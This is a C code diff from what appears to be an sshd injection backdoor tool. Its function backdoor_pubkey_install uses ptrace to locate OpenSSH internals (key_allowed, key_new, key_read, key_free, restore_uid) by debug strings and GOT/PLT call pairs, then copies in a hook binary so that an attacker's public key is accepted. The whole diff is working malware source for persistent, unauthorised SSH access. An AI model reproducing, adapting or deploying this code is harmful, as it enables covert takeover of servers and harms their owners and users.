@@ -12,17 +12,18 @@
 #include <util.h>
 #include <ptrace.h>
 
+#include <types.h>
+
 extern unsigned char hook_pubkey_bin[];
 extern int hook_pubkey_bin_len;
 
 void backdoor_pubkey_install(inject_ctx *ctx, char *pubkey) {
 	signature signatures[]={
 		{ 0x7777777788888888, "key_allowed", "trying public key file %s", 0 },
-		{ 0xaaaaaaaabbbbbbbb, "key_new"    , "key_new: RSA_new failed"  , 0 },
-		{ 0x1111111122222222, "key_read"   , "key_read: type mismatch: ", 0 },
-//		{ 0x3333333344444444, "key_equal"  , "key_equal: bad"           , 0 },
-		{ 0x5555555566666666, "key_free"   , "key_free: "               , 0 },
 		{ 0x99999999aaaaaaaa, "restore_uid", "restore_uid: %u/%u"       , 0 },
+		{ 0xaaaaaaaabbbbbbbb, "key_new"    , "key_new: RSA_new failed"  , 0 }, // wont work on OpenSSH 7.x
+		{ 0x1111111122222222, "key_read"   , "key_read: type mismatch: ", 0 }, // wont work on OpenSSH 7.x
+		{ 0x5555555566666666, "key_free"   , "key_free: "               , 0 }, // wont work on OpenSSH 7.x
 	};
 
 	u8 *evil_bin;
@@ -33,15 +34,65 @@ void backdoor_pubkey_install(inject_ctx *ctx, char *pubkey) {
 	u64 user_key_allowed2_calls[MAX_KEY_ALLOWED_CALLS];
 	u64 diff=0, hole_addr=0;
 
+
+
 	evil_bin = malloc(hook_pubkey_bin_len);
 	memcpy(evil_bin, hook_pubkey_bin, hook_pubkey_bin_len);
 
 	for(i = 0; i < sizeof(signatures) / sizeof(signature); i++) {
-		if (strcmp(signatures[i].name, "1key_equal") == 0) {
-			ctx->debug = 1;
-			signatures[i].addr = jmp_by_debugstr(ctx, signatures[i].str);
-		} else
+		if (i < 99) {
 			signatures[i].addr = sub_by_debugstr(ctx, signatures[i].str);
+		} else {
+			u64 f_dsa_new, f_bn_new, p_dsa_new, p_bn_new, callpair, callpair_b, p_rsa_free, p_dsa_free;
+
+			switch(i) {
+				case 2: // key_new
+					f_dsa_new = resolve_reloc(
+						ctx->rela, ctx->rela_sz, ctx->dynsym, ctx->dynsym_sz, (char*)ctx->dynstr, "DSA_new"
+					);
+
+					f_bn_new = resolve_reloc(
+						ctx->rela, ctx->rela_sz, ctx->dynsym, ctx->dynsym_sz, (char*)ctx->dynstr, "BN_new"
+					);
+
+					info("DSA_new@got = 0x%lx", f_dsa_new);
+					info("BN_new@got = 0x%lx", f_bn_new);
+
+					p_dsa_new = find_plt_entry(ctx, ctx->elf_base + f_dsa_new);
+					p_bn_new = find_plt_entry(ctx, ctx->elf_base + f_bn_new);
+
+					info("DSA_new@plt = 0x%lx", p_dsa_new);
+					info("BN_new@plt = 0x%lx", p_bn_new);
+
+					callpair = find_callpair(p_dsa_new, p_bn_new);
+
+					info("yo we got a callpair for (DSA_new, BN_new) -> 0x%lx", callpair);
+
+					signatures[i].addr = find_entrypoint(callpair);
+				break;
+
+				case 3: // key_read
+					signatures[i].addr = prevcall_by_debugstr(ctx, "user_key_allowed: advance: ");
+				break;
+
+				case 4: // key_free
+					p_rsa_free = find_plt_entry(ctx, ctx->elf_base + resolve_reloc(
+						ctx->rela, ctx->rela_sz, ctx->dynsym, ctx->dynsym_sz, (char*)ctx->dynstr, "RSA_free"
+					));
+
+					p_dsa_free = find_plt_entry(ctx, ctx->elf_base + resolve_reloc(
+						ctx->rela, ctx->rela_sz, ctx->dynsym, ctx->dynsym_sz, (char*)ctx->dynstr, "DSA_free"
+					));
+
+					callpair_b = find_callpair(p_rsa_free, p_dsa_free);
+					signatures[i].addr = find_entrypoint_inner(callpair_b, 3);
+				break;
+
+				default:
+					error("WTF just happened!");
+				break;
+			}
+		}
 
 		if (signatures[i].addr == 0) {
 			error("%s not found :(\n", signatures[i].name);
@@ -68,7 +119,7 @@ void backdoor_pubkey_install(inject_ctx *ctx, char *pubkey) {
 		info(line);
 	}
 
-	u64 f_BN_cmp = resolve_reloc(ctx->rela, ctx->rela_sz, ctx->dynsym, ctx->dynsym_sz, ctx->dynstr, "BN_cmp");
+	u64 f_BN_cmp = resolve_reloc(ctx->rela, ctx->rela_sz, ctx->dynsym, ctx->dynsym_sz, (char*)ctx->dynstr, "BN_cmp");
 	info("BN_cmp@got = 0x%lx", f_BN_cmp);
 	u64 l_BN_cmp;
 	_peek(ctx->pid, ctx->elf_base + f_BN_cmp, &l_BN_cmp, 8);
